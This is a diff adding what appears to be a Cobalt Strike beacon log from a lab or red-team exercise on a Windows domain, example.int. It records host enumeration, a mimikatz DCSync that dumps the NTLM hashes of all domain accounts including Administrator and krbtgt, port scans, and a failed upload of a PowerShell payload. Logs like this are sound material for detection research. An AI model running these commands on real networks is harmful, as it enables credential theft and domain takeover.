@@ -1,0 +1,189 @@
+08/17 20:13:38 UTC [metadata] beacon_500978634 -> 192.168.23.132; computer: COMPUTER03; user: user01; process: WinProcess.exe; pid: 6556; os: Windows; version: 10.0; build: 18363; beacon arch: x64 (x64)
+08/17 20:13:38 UTC [output]
+established link to parent beacon: 192.168.23.132
+
+08/17 20:14:35 UTC [input] <analyst01> shell whoami /groups
+08/17 20:14:35 UTC [task] <T1059> Tasked beacon to run: whoami /groups
+08/17 20:14:35 UTC [checkin] host called home, sent: 45 bytes
+08/17 20:14:35 UTC [output]
+received output:
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    
+
+
+08/17 20:15:05 UTC [input] <analyst01> shell whoami /groups /dom
+08/17 20:15:05 UTC [task] <T1059> Tasked beacon to run: whoami /groups /dom
+08/17 20:15:05 UTC [checkin] host called home, sent: 50 bytes
+08/17 20:15:05 UTC [output]
+received output:
+ERROR: Invalid argument/option - '/dom'.
+Type "WHOAMI /?" for usage.
+
+
+08/17 20:15:12 UTC [input] <analyst01> shell whoami /groups dom
+08/17 20:15:12 UTC [task] <T1059> Tasked beacon to run: whoami /groups dom
+08/17 20:15:12 UTC [checkin] host called home, sent: 49 bytes
+08/17 20:15:12 UTC [output]
+received output:
+ERROR: Invalid argument/option - 'dom'.
+Type "WHOAMI /?" for usage.
+
+
+08/17 20:16:00 UTC [input] <analyst01> shell whoami /all
+08/17 20:16:00 UTC [task] <T1059> Tasked beacon to run: whoami /all
+08/17 20:16:00 UTC [checkin] host called home, sent: 42 bytes
+08/17 20:16:00 UTC [output]
+received output:
+
+USER INFORMATION
+----------------
+
+User Name        SID                                           
+================ ==============================================
+example\user01 S-1-5-21-2173803269-2782387971-1800924430-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+
+08/17 20:17:02 UTC [input] <analyst01> net view
+08/17 20:17:02 UTC [task] <T1018, T1093> Tasked beacon to run net view
+08/17 20:17:02 UTC [checkin] host called home, sent: 104504 bytes
+08/17 20:17:03 UTC [output]
+received output:
+List of hosts:
+
+
+
+08/17 20:17:09 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+08/17 20:18:24 UTC [input] <analyst01> lsadump::dcsync /domain:example.int /all
+08/17 20:18:24 UTC [error] Unknown command: lsadump::dcsync /domain:example.int /all
+08/17 20:19:24 UTC [input] <analyst01> dcsync
+08/17 20:19:24 UTC [error] dcsync error: not enough arguments
+08/17 20:20:28 UTC [input] <analyst01> dcsync example.int
+08/17 20:20:28 UTC [task] <T1003, T1093> Tasked beacon to run mimikatz's @lsadump::dcsync /domain:example.int /all /csv command
+08/17 20:20:29 UTC [checkin] host called home, sent: 438858 bytes
+08/17 20:20:30 UTC [output]
+received output:
+[DC] 'example.int' will be the domain
+[DC] 'DC01.example.int' will be the DC server
+[DC] Exporting domain 'example.int'
+1001	DC01$	5118bc737e9b28c7e7f28c8733d88572	532480
+500	Administrator	e0b95107af635ad6b5018b2e0eaf82ea	512
+502	krbtgt	75b00ab89c935ba3773f11d30d66b219	514
+1000	user01	39bf3ac12fd5a276b56ac11ea09516b9	544
+1104	jdoe	83414a38169a47afeeca37d05a7edc3b	66048
+1105	COMPUTER02$	a645f73d8f632e6d79c33c0793995747	4096
+1107	COMPUTER03$	99f79427a69dc58ea7722f1036bc96e	4096
+1106	rrockstone	735cb4e5f8ee5e03d96841259fb28dad	66048
+
+
+08/17 20:23:06 UTC [checkin] host called home, sent: 12 bytes
+08/17 20:23:13 UTC [input] <analyst01> portscan null-255.255.255.255 53 arp 1024
+08/17 20:23:13 UTC [task] <T1046, T1093> Tasked beacon to scan ports 53 on null-255.255.255.255
+08/17 20:23:13 UTC [checkin] host called home, sent: 93245 bytes
+08/17 20:23:15 UTC [output]
+received output:
+(ARP) Target 'null-255.255.255.255' is alive. 00-0C-29-C2-44-A0
+Scanner module is complete
+
+
+08/17 20:24:13 UTC [checkin] host called home, sent: 12 bytes
+08/17 20:24:35 UTC [input] <analyst01> portscan null-255.255.255.255 53 icmp 1024
+08/17 20:24:36 UTC [task] <T1046, T1093> Tasked beacon to scan ports 53 on null-255.255.255.255
+08/17 20:24:36 UTC [checkin] host called home, sent: 93245 bytes
+08/17 20:24:38 UTC [output]
+received output:
+Scanner module is complete
+
+
+08/17 20:25:09 UTC [checkin] host called home, sent: 12 bytes
+08/17 20:25:23 UTC [input] <analyst01> portscan null-255.255.255.255 53 none 1024
+08/17 20:25:23 UTC [task] <T1046, T1093> Tasked beacon to scan ports 53 on null-255.255.255.255
+08/17 20:25:23 UTC [checkin] host called home, sent: 93245 bytes
+08/17 20:25:25 UTC [output]
+received output:
+Scanner module is complete
+
+
+08/17 20:26:15 UTC [checkin] host called home, sent: 19 bytes
+08/17 20:26:57 UTC [checkin] host called home, sent: 28 bytes
+08/17 20:27:01 UTC [checkin] host called home, sent: 20 bytes
+08/17 20:27:02 UTC [checkin] host called home, sent: 20 bytes
+08/17 20:27:04 UTC [checkin] host called home, sent: 52 bytes
+08/17 20:27:08 UTC [checkin] host called home, sent: 72 bytes
+08/17 20:27:08 UTC [error] could not open C:\Users\user01\*: 5
+08/17 20:27:08 UTC [error] could not open C:\Users\user01\*: 5
+08/17 20:27:27 UTC [checkin] host called home, sent: 76 bytes
+08/17 20:27:27 UTC [error] could not open C:\Users\FFlintstone\*: 5
+08/17 20:27:27 UTC [error] could not open C:\Users\FFlintstone\*: 5
+08/17 20:27:45 UTC [input] <analyst01> upload /home/analyst01/payloads/payload.ps1 (C:\Users\payload.ps1)
+08/17 20:27:45 UTC [task] <> Tasked beacon to upload /home/analyst01/payloads/payload.ps1 as C:\Users\payload.ps1
+08/17 20:27:45 UTC [indicator] file: 87c63902042be926a55d7f814e205636 3145 bytes C:\Users\payload.ps1
+08/17 20:27:45 UTC [checkin] host called home, sent: 3203 bytes
+08/17 20:27:45 UTC [error] could not upload file: 5
+08/17 20:38:44 UTC [input] <analyst01> unlink
+08/17 20:38:44 UTC [error] unlink error: not enough arguments
+08/17 20:39:18 UTC [error] lost link to parent beacon: 192.168.23.132
+08/17 20:40:16 UTC [output]
+established link to parent beacon: 192.168.23.131
+
+08/17 20:41:23 UTC [input] <analyst01> exit
+08/17 20:41:23 UTC [task] <> Tasked beacon to exit
+08/17 20:41:24 UTC [checkin] host called home, sent: 8 bytes
+08/17 20:41:24 UTC [output]
+beacon exit.
+
+08/17 20:41:25 UTC [error] lost link to parent beacon: 192.168.23.131
